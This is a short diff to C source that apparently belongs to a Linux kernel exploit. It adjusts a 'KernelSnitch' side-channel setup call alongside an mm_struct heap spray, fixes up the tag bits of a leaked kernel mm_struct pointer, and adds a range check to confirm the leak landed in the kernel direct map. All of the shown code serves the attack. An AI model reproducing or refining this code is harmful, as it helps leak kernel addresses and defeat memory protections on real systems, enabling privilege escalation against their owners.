@@ -55,7 +55,7 @@ int tcp_route_selected(void) {
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -478,7 +478,7 @@ uintptr_t prepare_kernel_page(void) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -568,8 +568,13 @@ uintptr_t prepare_kernel_page(void) {
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
           (size_t)ks->mm_struct, ms_since(&t_spray));
   uintptr_t leaked = ks->mm_struct;
+  /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+  leaked |= (uintptr_t)0xf << 56;
   last_mm_struct = leaked;
-  if (leaked == (uintptr_t)-1) {
+  /* mm_structs live in the direct map */
+  if (leaked == (uintptr_t)-1 ||
+      leaked < KERNELSNITCH_IDENTITY_START ||
+      leaked >= DIRECT_MAP_END) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
